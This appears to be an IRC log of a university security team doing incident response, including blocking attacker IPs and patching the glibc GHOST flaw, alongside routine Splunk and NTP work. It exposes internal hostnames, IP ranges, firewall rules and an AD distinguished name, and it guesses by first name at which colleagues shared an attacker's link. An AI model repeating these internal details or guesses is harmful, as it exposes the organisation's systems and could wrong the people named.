2015-01-26 13:26:46	wraquel	So, tom says that he tested out access from that system, npcf-power, and they can't access the BAS systems.
2015-01-26 13:27:50	eyrich	BAS?
2015-01-26 13:28:46	wraquel	dunno.
2015-01-26 13:29:03	wraquel	But someone needs to reeval their hosts and public access to them
2015-01-26 13:29:13	eyrich	i think there were supposed to be router ACLs in place to protect the systems
2015-01-26 13:31:48	wraquel	hmmm. can you check with networking to see if mssql is protected and in place?
2015-01-26 13:31:55	wraquel	I don't know if mssql was considered.
2015-01-26 13:49:50	--	irc: disconnected from server
2015-01-26 13:50:01	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-01-26 13:50:01	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2015-01-26 13:50:13	--	Mode #security [+]
2015-01-26 13:50:13	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-01-26 13:53:07	wraquel	from on campus? Cause it's blocked at the exit
2015-01-26 13:53:17	jazoff	from home
2015-01-26 13:53:27	eyrich	its bhrd
2015-01-26 13:53:37	jazoff	ah
2015-01-26 13:53:49	jazoff	someone could potentially use it to DoS something internal, but unlikely
2015-01-26 13:54:14	eyrich	the issue is I think it needs access to some power stuff that is on campus IP space
2015-01-26 13:54:15	jazoff	er, not.. was thinking about it backwards
2015-01-26 13:54:39	jazoff	my experience with power people I'd say they have no idea how their equipment works
2015-01-26 13:54:45	wraquel	from tom: It's okay for the rest of today and until mid-day tomorrow, but I'll need to be able to check some parameters and set points and make adjustments tomorrow afternoon.
2015-01-26 13:54:48	jazoff	or that they are even running mssql
2015-01-26 13:55:36	eyrich	can we get admin rights? I can lock stuff down with the firewall
2015-01-26 13:56:11	wraquel	eyrich: I dunno. I'll ask
2015-01-26 13:56:36	eyrich	i sent a ticket to neteng
2015-01-26 14:11:18	wraquel	so, that reflex-gallery plugin was updated on 1/8
2015-01-26 14:11:23	wraquel	To the latest version.
2015-01-26 14:20:36	jschipp	I had a genius idea last night to create a PXE book VM on my laptop so I wouldn't need to carry around USB disks and discs for Linux installs: https://github.com/jonschipp/vagrant/tree/master/pxe-kickstart
2015-01-26 14:20:42	jschipp	boot*
2015-01-26 14:21:05	jazoff	there used to be boot.kernel.org
2015-01-26 14:21:42	eyrich	wraquel: can you see if there were any flash files uploaded to the wordpress sites, maybe a flash exploit
2015-01-26 14:23:12	jschipp	hmm, a few other have projecst like that (boot.fedoraproject.org) but still looks like you have to have the boot program on some media which defeats the purpose for me
2015-01-26 14:23:43	jazoff	if your phone is rooted this is pretty awesome: https://play.google.com/store/apps/details?id=com.softwarebakery.drivedroid&hl=en
2015-01-26 14:24:26	jschipp	wow
2015-01-26 14:24:32	jschipp	too bad mine isn't :(
2015-01-26 14:28:17	jazoff	yeah, if I had a use for it currently i'd use my old galaxy nexus 32G :)
2015-01-26 14:29:43	wraquel	I think he showed off to his friends.
2015-01-26 14:29:44	wraquel	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/flashtimeline?q=search%20source%3D%22%2Fbro%2Flogs%2Fcurrent%2Fhttp_inbound.log%22%20id_resp_h%3D141.142.193.38%20uri%3D%22%2Fx.php%22&earliest=1422187200&latest=1422194400
2015-01-26 14:29:57	wraquel	x.php hits from 2 other IPs, but no referrer info
2015-01-26 14:30:49	wraquel	eyrich: nope. The POSTs don't indicate files that are uploaded, however, if there were any swt and such files, we could see that through bro.
2015-01-26 14:30:58	wraquel	Which, I don't recall seeing any.
2015-01-26 14:31:13	wraquel	Or, at least for downloads.
2015-01-26 14:39:52	wraquel	eyrich: block 69.42.220.27 and 94.23.88.5.
2015-01-26 14:40:16	wraquel	Either the same guy or friends of our ichass attacker.
2015-01-26 14:40:39	eyrich	done
2015-01-26 14:43:49	jazoff	this is intersting...
2015-01-26 14:43:55	jazoff	ninfo nfi_stats 69.42.220.27
2015-01-26 14:43:56	ncsabot	Seen in 2 out of 422 days.
2015-01-26 14:43:57	ncsabot	 * 2014-10-11.db 1/24
2015-01-26 14:43:57	ncsabot	 * 2015-01-25.db 1/24
2015-01-26 14:44:11	jazoff	what was that date in oct that you said the other files were from?
2015-01-26 14:46:11	wraquel	what time block on 10-11?
2015-01-26 14:46:37	wraquel	10-24
2015-01-26 14:46:57	wraquel	traffic to 94.23.88.5
2015-01-26 14:46:58	ncsabot	Seen in 2 hours over 1 days. First seen in 2015-01-25.db. Last seen in 2015-01-25.db
2015-01-26 14:47:18	wraquel	looks like http traffic.
2015-01-26 14:48:01	wraquel	found it
2015-01-26 14:48:48	wraquel	zcat /data/bro/2014/10/2014-10-11/http_inbound.20\:00\:00-21\:00\:00.log.gz | grep 69.42.220.27
2015-01-26 14:49:56	wraquel	that's weird.
2015-01-26 14:50:00	wraquel	as1224.http.sasm3.net
2015-01-26 14:50:06	wraquel	It points back to us.
2015-01-26 14:51:38	wraquel	as1224.http.sasm3.net is an alias for www.ncsa.uiuc.edu.
2015-01-26 14:51:49	wraquel	But it's registered through an outside entity
2015-01-26 14:52:25	jazoff	looks like ti works for other ASs
2015-01-26 14:52:42	wraquel	ahh.
2015-01-26 14:52:46	wraquel	good cal
2015-01-26 14:53:14	wraquel	as38.http.sasm3.net is an alias for illinois.edu.
2015-01-26 14:53:19	wraquel	so it does.
2015-01-26 15:00:01	jschipp	brb, walk
2015-01-26 15:23:24	soehlert	jazoff: npcf-power had eyrich and i chatting. can we set up some sort of whitelist and get a report from splunk when a non whitelisted host starts accepting rdp?
2015-01-26 15:23:34	soehlert	presumably using bro's known-services
2015-01-26 15:25:41	jazoff	yeah
2015-01-26 15:26:47	jazoff	you can tehnically do the whitelist in splunk
2015-01-26 15:26:56	jazoff	just need to tag the hosts with something like rdpok
2015-01-26 15:27:19	jazoff	then the report is just something like source=*known_services* NOT tag=rdpok
2015-01-26 15:54:44	soehlert	jazoff: where are we at with the ntp stuff?
2015-01-26 15:55:00	jazoff	good, I think
2015-01-26 15:55:19	jazoff	I changed some things around in the ntp modules so it worked like eyrich said it should
2015-01-26 15:55:25	jazoff	can possibly simplify things even more
2015-01-26 15:55:27	soehlert	is it in all branches?
2015-01-26 15:55:35	jazoff	oh, hmm
2015-01-26 15:55:43	jazoff	I think jschipp got it merged into ncsa_production
2015-01-26 15:55:51	soehlert	and production?
2015-01-26 15:55:55	jazoff	yeah
2015-01-26 15:56:01	jazoff	I think I did not break it :)
2015-01-26 15:56:06	soehlert	ok cool
2015-01-26 15:56:13	jazoff	the regular and CA ntp templates are pretty much the same at this point
2015-01-26 15:56:41	jazoff	and there is no more separate ntp class for a vm, the standard policy just uses a template
2015-01-26 15:56:57	jazoff	see puppet/modules/ntp/templates/ntp.conf.erb
2015-01-26 15:57:01	jazoff	<% if @is_virtual == "true" -%>
2015-01-26 15:57:03	jazoff	and stuff
2015-01-26 15:57:05	soehlert	when you say pretty much the same do you mean exactly or just slight difference vs totally opposite?
2015-01-26 15:57:22	jazoff	only difference is 
2015-01-26 15:57:22	jazoff	restrict 192.168.10.0 mask 255.255.255.0 nomodify notrap
2015-01-26 15:57:25	jazoff	in the CA one
2015-01-26 15:57:51	soehlert	gotcha
2015-01-26 15:58:21	jazoff	so they can probably be merged further
2015-01-26 15:58:44	soehlert	we could do a conditional right?
2015-01-26 15:58:56	jazoff	oh, also one problem I had fixed was there was a copy/paste typo so ntp wasn't actually getting installed on most boxes
2015-01-26 15:59:05	jazoff	yeah, or something like ntp::extacfg in hiera
2015-01-26 15:59:19	soehlert	oh crap. 
2015-01-26 15:59:28	jazoff	i dunno what that setting was for exactly
2015-01-26 15:59:45	soehlert	what setting was it? or you odnt remember now?
2015-01-26 16:00:14	jazoff	nono, i mean what the restrict line is for
2015-01-26 16:00:19	jazoff	like, in english
2015-01-26 16:00:26	soehlert	oooo
2015-01-26 16:00:34	soehlert	ya im not familiar with it either
2015-01-26 16:22:52	jschipp	it's acl to say only clients of this ip/net can make ntp requests
2015-01-26 16:22:58	jschipp	i believe
2015-01-26 16:24:57	jschipp	yeah, that's it
2015-01-26 16:25:25	soehlert	i think thats right, i just dont know exactly how that works. 
2015-01-26 16:25:30	soehlert	link?
2015-01-26 16:25:36	jazoff	ah, so why is that needed?
2015-01-26 16:25:43	jazoff	something about the HSMs?
2015-01-26 16:25:56	soehlert	ya the HSMs get their clock from these hosts
2015-01-26 16:28:39	jschipp	http://support.ntp.org/bin/view/Support/AccessRestrictions
2015-01-26 16:32:18	jschipp	notrap explained here: https://www.freebsd.org/cgi/man.cgi?query=ntp.conf&sektion=5
2015-01-26 16:57:36	wraquel	interesting referrer to ichass.illinois.edu/x.php. http://l.facebook.com/l.php?u=http%3A%2F%2Fichass.illinois.edu%2Fx.php&h=gAQFUgom2&enc=AZOPnzKXGhwI3qC4s2nwF-suuanAif1kYlrFD-L7FW91z2skZqrqcOOv_nGwvMMVo44-p8TKAzjsBrgUP8SmN_myRcbrAey42nTqdpINtQrTmN75FwheN4QrFKyjRjeSXtXx8prKjX_35Pc9cUbb-CV2&s=1
2015-01-26 17:00:42	wraquel	I'm guessing someone send the link to a friend over facebook.
2015-01-26 17:00:50	soehlert	hah that is strange
2015-01-26 18:04:12	jazoff	too bad we probably need a subpoena to find out who
2015-01-26 18:37:41	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Ping timeout)
2015-01-27 08:45:08	wraquel	Given the timing, I'm guessing it's probably Trish, perhaps Bill.
2015-01-27 11:21:50	jazoff	ut oh http://ma.ttias.be/critical-glibc-update-cve-2015-0235-gethostbyname-calls/
2015-01-27 11:27:03	wraquel	oh glibc....
2015-01-27 11:33:16	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2015-01-27 11:45:18	jschipp	there's an OpenStack talk at 12 in 1040
2015-01-27 11:47:15	wraquel	jazoff: ug. Sounds like the only course of action currently is to try to monitor DNS.
2015-01-27 11:49:19	jazoff	ah... so, bro should be ok
2015-01-27 11:49:40	jazoff	it does ip -> hostname lookups, but not any hostname -> ip that i can think of
2015-01-27 11:50:14	jazoff	http://www.openwall.com/lists/oss-security/2015/01/27/9
2015-01-27 11:50:24	jazoff	so, digits and dots, but > 1024 chars
2015-01-27 11:52:34	jazoff	[jazoff@bro-dev tmp]$ ./exp
2015-01-27 11:52:35	jazoff	vulnerable
2015-01-27 11:52:37	jazoff	fun
2015-01-27 11:54:39	jazoff	this is going to be not good
2015-01-27 11:55:47	wraquel	so, can we get bro to look for DNS hostnames that are larger than 1024?
2015-01-27 11:55:59	jazoff	yeah
2015-01-27 11:56:06	jazoff	oh
2015-01-27 11:56:07	jazoff	actually
2015-01-27 11:56:13	jazoff	not sure if they would even make it that far
2015-01-27 11:56:31	jazoff	that link shows an exploit against exim by sending a malformed HELO
2015-01-27 11:56:48	wraquel	...
2015-01-27 11:58:41	jschipp	uh uh glibc vuln
2015-01-27 12:04:45	jazoff	I think the problem with this is that it is somewhat like the bash one
2015-01-27 12:05:08	jazoff	there will end up being 100 different exploitation vectors
2015-01-27 12:05:28	jazoff	so not like a ssl issue where you just find anything running ssl.. 
2015-01-27 12:06:08	wraquel	Well, no, but might as well start somewhere.
2015-01-27 12:06:29	jazoff	where? :)
2015-01-27 12:07:14	wraquel	passive dns?
2015-01-27 12:07:28	jazoff	right.. but I dont think it has anything to do with actual dns traffic
2015-01-27 12:07:51	wraquel	right. It's host->ip.......
2015-01-27 12:08:03	wraquel	hrm.
2015-01-27 12:08:54	jazoff	well it's gethostbyname(host) -> boom
2015-01-27 12:08:58	wraquel	hmmm... I need to leverage this for the CTF.
2015-01-27 12:09:10	jschipp	lol
2015-01-27 12:33:45	jazoff	so, seems like a patch should be able to be released pretty quick for this....
2015-01-27 12:38:52	wraquel	yeah
2015-01-27 13:22:32	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2015-01-27 13:22:41	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2015-01-27 13:34:20	jazoff	O.O
2015-01-27 13:34:25	jazoff	http://googleblog.blogspot.com/2015/01/google-fiber-new-metro-areas.html
2015-01-27 13:34:57	eyrich	cool
2015-01-27 13:36:08	jazoff	Not sure if they'd have it exactly where I am now, but we are looking to move to Avondale Estates later this year
2015-01-27 13:36:45	jazoff	which is pretty small, so hopefully 100% coverage
2015-01-27 13:37:24	jazoff	in the meantime, I bet i can get a discount on comcast :)
2015-01-27 13:44:35	jazoff	http://www.openwall.com/lists/oss-security/2015/01/27/18
2015-01-27 14:03:33	wraquel	linky no worky
2015-01-27 14:03:42	wraquel	nvrmind
2015-01-27 14:26:38	soehlert	jazoff: i followed your lead and not in a good way. cracked my screen on the nexus 5 :(
2015-01-27 14:27:13	jazoff	:(
2015-01-27 14:27:19	jazoff	mines been getting worse too
2015-01-27 14:27:30	soehlert	the crack?
2015-01-27 14:27:35	jazoff	yeah
2015-01-27 14:27:43	jazoff	it's mostly at the bottom so it's really not ever a problem
2015-01-27 14:27:59	soehlert	luckily mine is off to the side and doesnt affect touch but i hate seeing it
2015-01-27 14:28:06	soehlert	are you going to replace your screen?
2015-01-27 14:38:27	soehlert	man are we really able to compress syslog to 3.4GB for the month of January total?
2015-01-27 14:38:38	jazoff	hmm
2015-01-27 14:38:53	jazoff	well when I run the program that re-packs things it expands a little
2015-01-27 14:39:11	soehlert	[root@lowp 01]# pwd
2015-01-27 14:39:11	soehlert	/data/syslogs/seclogs/2015/01
2015-01-27 14:39:11	soehlert	[root@lowp 01]# du -sh
2015-01-27 14:39:11	soehlert	3.4G    .
2015-01-27 14:39:21	jazoff	yeah
2015-01-27 14:40:13	jazoff	oh, that's not much less than other months
2015-01-27 14:40:21	jazoff	still need to remove the old .tbz files
2015-01-27 14:40:54	soehlert	ok that just seemed super low
2015-01-27 14:40:54	soehlert	but i mean i guess they can be pretty compressed
2015-01-27 14:40:54	soehlert	alex was just looking for a rough daily average
2015-01-27 14:41:17	jazoff	ah
2015-01-27 14:41:20	jazoff	yeah, pretty small compressed
2015-01-27 14:41:28	jazoff	often the biggest logs are just millions of the same error
2015-01-27 14:41:36	soehlert	ya thats what i figured
2015-01-27 14:41:51	soehlert	and 4.3GB/day for bro logs sound about right? i did the same type of math.
2015-01-27 14:41:57	soehlert	ie du -sh on the month and divide by days
2015-01-27 14:44:03	jazoff	yeah
2015-01-27 14:44:28	jazoff	usually lower on weekends
2015-01-27 14:56:23	eyrich	reagrding ghost - is someone sending out an email?
2015-01-27 14:56:26	eyrich	Wayne is asking
2015-01-27 14:58:10	jazoff	https://rhn.redhat.com/errata/RHSA-2015-0090.html
2015-01-27 14:58:13	jazoff	patch is out for rhel
2015-01-27 14:59:36	eyrich	is there information on which versions are vulnerable?
2015-01-27 15:00:45	jazoff	RHEL 5
2015-01-27 15:03:03	eyrich	qualys says rhel 6 and 7 also
2015-01-27 15:03:07	eyrich	https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/01/27/the-ghost-vulnerability
2015-01-27 15:04:01	jazoff	ah
2015-01-27 15:04:12	jazoff	https://access.redhat.com/security/cve/CVE-2015-0235 doesnt list rhel6 yet
2015-01-27 15:16:57	wraquel	https://rhn.redhat.com/errata/RHSA-2015-0092.html
2015-01-27 15:17:06	wraquel	Apparently they've already been addressed
2015-01-27 15:18:51	jazoff	hmm, i upgraded glibc on bro-dev to glibc-2.12-1.149.el6_6.4.x86_64
2015-01-27 15:18:59	jazoff	but the test program still says vulnerable
2015-01-27 15:19:12	jazoff	oh, need 6.5
2015-01-27 15:19:15	wraquel	yeah
2015-01-27 15:19:49	wraquel	So they're calling it ghost now. huh
2015-01-27 15:19:57	jazoff	yeah.. GetHOSTbyname
2015-01-27 15:28:38	wraquel	Didn't notice they named it in the Qualys release.
2015-01-27 15:34:28	eyrich	everything needs name - they learned from heartbleed
2015-01-27 15:34:42	eyrich	campus cluster and iforge are vulnerbale
2015-01-27 15:36:15	soehlert	jazoff: what was the s3cmd command for testing that proved that it should work? it's failing and instead of researching they are blaming us
2015-01-27 15:37:07	jazoff	s3cmd ls 
2015-01-27 15:39:48	soehlert	gracias
2015-01-27 15:51:47	wraquel	jazoff: what are you using to detect if vulnerable?
2015-01-27 15:52:41	jazoff	http://www.openwall.com/lists/oss-security/2015/01/27/9
2015-01-27 15:52:46	jazoff	--[ 4 - Case studies ]--------------------------------------------------------
2015-01-27 15:55:32	wraquel	eyrich: GHOST is QID 123191.
2015-01-27 15:55:53	wraquel	Can we do a one off to detect who's vulnerable.
2015-01-27 16:47:21	jschipp	what package is the patched glibc in?
2015-01-27 16:48:39	jschipp	nvm
2015-01-27 17:34:54	jschipp	update all my systems
2015-01-27 17:34:57	jschipp	updated*
2015-01-27 20:18:25	<--	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has quit (Input/output error)
2015-01-28 07:55:45	jschipp	fml
2015-01-28 07:56:24	jschipp	so I went to bed at 3 a.m. and then I recieved a call from a client at 5 a.m. for support
2015-01-28 07:57:38	 *	jschipp feeling cranky
2015-01-28 08:34:22	-->	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has joined #security
2015-01-28 08:56:10	jschipp	rebooting git-sec
2015-01-28 09:06:54	jschipp	it's up
2015-01-28 09:12:46	wraquel	BW Bug meeting. They're wanting to go ahead and push updates for this bug on the bastion hosts.
2015-01-28 09:16:20	jazoff	centos has the update now too
2015-01-28 09:19:19	wraquel	soehlert: so, when you get in, you have the green light to kick off users and patch out of cycle for the BW bastions. 
2015-01-28 09:20:16	jazoff	kick off users?
2015-01-28 09:20:48	wraquel	if there are any on the bastions at the time. I mean give them notice that it's going to be rebooted.
2015-01-28 09:20:57	jazoff	oh.. a reboot shouldn't be needed
2015-01-28 09:21:12	jazoff	just need to restart any services that are using libc (which should be just sshd if anything)
2015-01-28 09:22:27	wraquel	Well, I'll leave that for Sam.
2015-01-28 09:22:48	jazoff	ah, actually, a bunch of things
2015-01-28 09:23:11	jazoff	guess a reboot couldn't hurt, especially if there are other updates anyway
2015-01-28 09:27:10	eyrich	off the top of yuor head, do you know how to figure out when a package was installed by RPM?
2015-01-28 09:27:13	eyrich	anyone?
2015-01-28 09:27:22	jazoff	yeah..
2015-01-28 09:28:30	jazoff	sudo yum history package-info glibc
2015-01-28 09:29:07	jazoff	or sudo yum history summary glibc
2015-01-28 09:32:37	eyrich	that report says that glibc-2.12-1.149 came out in november
2015-01-28 09:33:10	jazoff	need the full version..
2015-01-28 09:33:17	eyrich	?
2015-01-28 09:33:32	jazoff	glibc-2.12-1.149.el6_6.5
2015-01-28 09:34:05	wraquel	yeah, you want 6.5
2015-01-28 09:34:09	wraquel	not 6.4
2015-01-28 09:35:59	wraquel	Weird.
2015-01-28 09:36:14	wraquel	I just logged into fog. And this showed up in the middle of the motd
2015-01-28 09:36:22	wraquel	nfdump -M /data/nfdump  -T  -R 2014/11/27/nfcapd.201411270000:2014/11/27/nfcapd.201411272355 -o extended -O tstart "host 141.142.226.150" > flows.20141127
2015-01-28 09:36:24	wraquel	nfdump -M /data/nfdump  -T  -R 2014/11/28/nfcapd.201411280000:2014/11/28/nfcapd.201411282355 -o extended -O tstart "host 141.142.226.150" > flows.20141128
2015-01-28 09:37:05	jazoff	odd
2015-01-28 09:37:23	jazoff	did you run those commands at any point?
2015-01-28 09:38:39	wraquel	not on fog
2015-01-28 09:38:45	wraquel	I would have done that on lowp or something.
2015-01-28 09:38:53	jazoff	weird
2015-01-28 09:39:01	wraquel	maybe flows-sec
2015-01-28 09:39:04	wraquel	but not on fog.
2015-01-28 09:39:11	wraquel	I logged back in and it's fine
2015-01-28 09:40:51	jschipp	not me
2015-01-28 09:46:00	wraquel	http://www.tenable.com/blog/tenable-responds-to-cve-2015-0235-ghost
2015-01-28 10:57:42	jazoff	soehlert: I tested that test code on bro-dev after I upgraded glibc, it says the update fixed it
2015-01-28 10:58:10	jazoff	(and it said vulnerable before)
2015-01-28 11:08:10	eyrich	somone working on cool?
2015-01-28 11:15:52	jschipp	nope
2015-01-28 11:19:53	jazoff	splunk called about the support request.. wanted me to upload screenshots (which I did)
2015-01-28 11:20:03	jazoff	don't really see how they will help, but anything to get this worked out
2015-01-28 11:25:18	jschipp	jazoff: what do you think about running a CoreOS host on each ESX node so we can put influxdb, grafana, etc. there?
2015-01-28 11:26:28	jazoff	I haven't played with coreos yet
2015-01-28 11:27:51	jschipp	eyrich: terry changed the pem file on cool
2015-01-28 11:28:07	eyrich	ok
2015-01-28 11:28:30	jschipp	jazoff: me either, it's a good opportunity :)
2015-01-28 11:29:34	jazoff	docker does make some things potentially easier
2015-01-28 11:29:44	jschipp	blah, blah ;)
2015-01-28 11:30:00	jschipp	have you tried swarm yet?
2015-01-28 11:30:40	jazoff	no
2015-01-28 11:32:21	jazoff	that seems useful for things like worker nodes or stateless web servers, but I don't knwo how people are running persistent services on top of that
2015-01-28 11:37:23	jazoff	eyrich: any update on that phishing detectoin thing?
2015-01-28 11:37:32	jazoff	I have the bro stuff ready to go
2015-01-28 11:43:33	eyrich	what updates are you looking for?
2015-01-28 11:43:54	eyrich	where do we put the bad domains?
2015-01-28 11:45:58	jazoff	we could put them in the portal
2015-01-28 11:46:42	jazoff	the table editor thing I made will work for this
2015-01-28 11:46:55	jazoff	would be like this one
2015-01-28 11:46:55	jazoff	https://portal-sec.internal.ncsa.edu/admin/django_bro_tables/table/4/
2015-01-28 12:00:21	jazoff	https://portal-sec.internal.ncsa.edu/admin/django_bro_tables/table/7/
2015-01-28 12:11:01	jazoff	eyrich: deployed to bro-dev, seems to work
2015-01-28 12:11:37	jazoff	i'd go with BHRing based on the http alert but notifying on both http and dns
2015-01-28 12:19:37	jazoff	eyrich: so, if you have names, just add them at the /7/ link
2015-01-28 13:26:53	jazoff	ah, got the splunk thing working
2015-01-28 13:26:57	jazoff	turns out it was an easy fix..
2015-01-28 13:27:13	jazoff	the splunk bro app needs to be on the forwader too
2015-01-28 13:29:13	jazoff	apparently index time field extractions aren't done on the indexer.. 
2015-01-28 13:35:06	soehlert	working on the bastions now
2015-01-28 13:45:58	eyrich	jazoff: thanks I emailed Wayland for some example domains being used now
2015-01-28 13:48:02	jazoff	so, looks like we can proceed with the splunk server migration now that that silly issue is worked out
2015-01-28 13:48:52	jazoff	only issue is since the forwarder needs to be upgraded i'm not sure if we can do supercell -> old+new servers
2015-01-28 13:49:21	jazoff	so we may just have to cut over
2015-01-28 13:54:07	soehlert	ok well its a one time thing so if we have to, we have to
2015-01-28 13:55:40	jazoff	shouldn't be too bad
2015-01-28 13:55:56	jazoff	looks like the main thing i need to tweak on the splunk bro app is to turn off the thing that sends all bro logs to the bro index
2015-01-28 13:56:05	jazoff	since I want to do the bro/bro_bulk split
2015-01-28 13:56:41	soehlert	right
2015-01-28 13:56:49	soehlert	so the fix was just add it to the forwarder and al is well?
2015-01-28 13:56:57	jazoff	yeah
2015-01-28 13:57:15	jazoff	to get indexed field extractions you need the settings on the forwarder
2015-01-28 13:57:17	jazoff	makes perfect sense :)
2015-01-28 13:57:59	soehlert	sigh...of course!
2015-01-28 13:58:36	wraquel	Can we use the new splunk head to reference the old indexer?
2015-01-28 13:59:12	wraquel	And just do all our searches and reports from the new interface?
2015-01-28 13:59:16	wraquel	Heading down to all staff meeting.
2015-01-28 13:59:30	wraquel	Call info is in the Bytes and Pieces email.
2015-01-28 14:02:05	soehlert	jazoff: was there anything else you needed from me as far as the splunk stuff goes?
2015-01-28 14:02:12	soehlert	cant remember where we left that
2015-01-28 14:10:06	wraquel	Do we have enough index drive space for it?
2015-01-28 14:16:18	wraquel	Justin, you just got an award
2015-01-28 14:16:36	wraquel	Technical Achievement for the Bro Team
2015-01-28 14:32:40	soehlert	woo jazoff 
2015-01-28 14:35:01	jazoff	thanks.. adam told me before since I wouldn't be there :)
2015-01-28 14:35:31	jazoff	soehlert: looks like kerberos isn't setup on splunk-sec
2015-01-28 14:35:36	jazoff	but otherwise i think we are ok
2015-01-28 14:44:04	soehlert	ok i'll work on that
2015-01-28 14:53:10	jazoff	blew away the splunk config on bro-dev and had puppet add it back.. looks like it worked
2015-01-28 14:53:15	jazoff	so should be ok for supercell
2015-01-28 14:53:30	jazoff	which was also the thing holding up the supercell->centos
2015-01-28 14:55:14	jazoff	eyrich: need a AD user/password at some point for setting up splunk ldap auth
2015-01-28 15:41:07	soehlert	splunk sec now does kerb auth
2015-01-28 15:41:33	jazoff	cool
2015-01-28 15:41:53	jazoff	so I think we are in pretty good shape 
2015-01-28 15:42:25	jazoff	i may want to wipe out the current stuff on splunk-sec and start over fresh..
2015-01-28 15:42:32	jazoff	after maybe importing an index or two from cyclone
2015-01-29 09:28:24	eyrich	fine by me
2015-01-29 09:30:59	eyrich	splunk ladp  username and password in shared lastpass
2015-01-29 09:31:06	jazoff	ok
2015-01-29 10:22:47	jazoff	jschipp: can you make syslog send to splunk-sec like it is currently sending to cyclone?
2015-01-29 10:32:49	jazoff	eyrich: Encountered the following error while trying to save: In handler 'LDAP-auth': strategy="Security AD" Error binding to LDAP. reason="Invalid credentials"
2015-01-29 10:32:53	jazoff	hmm
2015-01-29 10:36:16	jazoff	what's the full DN for the splunkldap user? maybeit wants that
2015-01-29 10:38:24	eyrich	CN=Splunk LDAP,CN=Users,DC=ad,DC=security,DC=ncsa,DC=illinois,DC=edu
2015-01-29 10:38:44	jazoff	ah, progress
2015-01-29 10:39:29	jazoff	got it, i think
2015-01-29 10:52:35	jazoff	eyrich: can you change my email address on our duo instance to jazoff@ncsa.edu ?
2015-01-29 10:52:47	jazoff	cant add jazoff@illinois to the cites once since I already exist in ours
2015-01-29 10:52:59	jazoff	and adding jazoff@ncsa to the cites one will just be confusing
2015-01-29 10:55:47	eyrich	i cant
2015-01-29 10:55:56	eyrich	no admin privelages
2015-01-29 10:56:25	eyrich	Security doesnt have one any more - just the CITES one
2015-01-29 10:56:52	eyrich	the dou for getting into sects01 is CITES
2015-01-29 10:57:15	jazoff	oh
2015-01-29 10:57:41	jazoff	cites said "Because your email is associated with the NCSA
2015-01-29 10:57:41	jazoff	instance, it will not let me use it to create an admin account in our Duo
2015-01-29 10:57:41	jazoff	instance."
2015-01-29 10:57:58	jazoff	splunk AD auth is working, you should be able to login to http://splunk-sec.internal.ncsa.edu:8000
2015-01-29 10:58:06	jazoff	that reminds me, need a ssl cert
2015-01-29 10:58:17	eyrich	you have duo for sects01 already right?
2015-01-29 10:58:52	jazoff	I did at one time
2015-01-29 10:59:20	jazoff	still exists on my phone, but that says ncsa, not cites
2015-01-29 10:59:28	eyrich	if you open duo on your phone what keys does it list
2015-01-29 10:59:34	eyrich	oh ok
2015-01-29 10:59:36	eyrich	i have noth
2015-01-29 10:59:38	eyrich	both
2015-01-29 10:59:43	jazoff	NCSA and NCSA admin
2015-01-29 10:59:45	eyrich	let me see what I can figure out
2015-01-29 11:00:39	eyrich	ok I see you cant have same email if you are admins - working oni t
2015-01-29 11:01:03	eyrich	you are deleted from NCSA test Duo
2015-01-29 11:01:21	jazoff	ok, i will have them try to add me agian
2015-01-29 11:19:11	jschipp	jazoff: yeah, I'll configure forwarding for it now
2015-01-29 11:19:47	jazoff	great
2015-01-29 11:21:54	jschipp	should I remove cyclone or keep it for now?
2015-01-29 11:21:59	jazoff	keep it for now
2015-01-29 11:22:16	jschipp	kk
2015-01-29 11:27:23	jschipp	should be forwarding now
2015-01-29 11:29:16	jazoff	hmm
2015-01-29 11:29:34	jazoff	doesnt look like it
2015-01-29 11:29:53	jazoff	not seeing any traffic
2015-01-29 11:29:53	jschipp	10.142.148.54?
2015-01-29 11:30:03	jazoff	yeah
2015-01-29 11:30:11	jazoff	tcp 1514?
2015-01-29 11:30:15	jschipp	yeah
2015-01-29 11:30:16	jschipp	hmmm
2015-01-29 11:30:26	jazoff	it need to be HUP'd or soemthing?
2015-01-29 11:30:48	jschipp	it has been
2015-01-29 11:31:35	jschipp	10.142.158.70:38556         10.142.148.54:1514          SYN_SENT
2015-01-29 11:31:39	jschipp	you blocking?
2015-01-29 11:32:13	jazoff	hmm
2015-01-29 11:32:43	jschipp	check iptables
2015-01-29 11:32:58	jazoff	what host is that?
2015-01-29 11:37:14	jschipp	relay01-sec: 10.142.158.70
2015-01-29 11:37:34	jschipp	relay02-sec:10.142.158.71
2015-01-29 11:42:52	jazoff	hmm
2015-01-29 11:43:29	jazoff	the rule is there..
2015-01-29 11:43:30	jazoff	ACCEPT     tcp  --  10.142.148.0/24      0.0.0.0/0           multiport dports 1514 /* 200 splunk syslog - private */
2015-01-29 11:43:32	jazoff	ACCEPT     tcp  --  141.142.148.0/25     0.0.0.0/0           multiport dports 1514 /* 200 splunk syslog - public */
2015-01-29 11:43:35	jazoff	oooh, 158?
2015-01-29 11:43:53	jschipp	yerp
2015-01-29 11:43:58	jazoff	158 is just the syslog boxes?
2015-01-29 11:44:05	jschipp	yeah
2015-01-29 11:49:12	jazoff	ACCEPT     tcp  --  10.142.158.0/24      0.0.0.0/0           multiport dports 1514 /* 200 splunk syslog - syslog hosts */
2015-01-29 11:51:23	jazoff	hmm
2015-01-29 11:51:38	jazoff	is pfsense blocking that by any chance?
2015-01-29 11:59:13	jschipp	that could be the rest of the forwarding ips are public
2015-01-29 11:59:15	jschipp	eyrich: 
2015-01-29 11:59:49	jschipp	hmmm, there may not be a route, can't remember
2015-01-29 12:00:35	jazoff	i dont even see the incoming syn
2015-01-29 12:09:58	jazoff	i dunno, how did cyclone even work?
2015-01-29 12:10:07	jschipp	public ip
2015-01-29 12:10:19	jazoff	ah
2015-01-29 12:47:59	wraquel	cyclone had a public ip?
2015-01-29 12:48:24	wraquel	Oh. I suppose it has to to receive feeds.
2015-01-29 13:02:59	jschipp	yeah
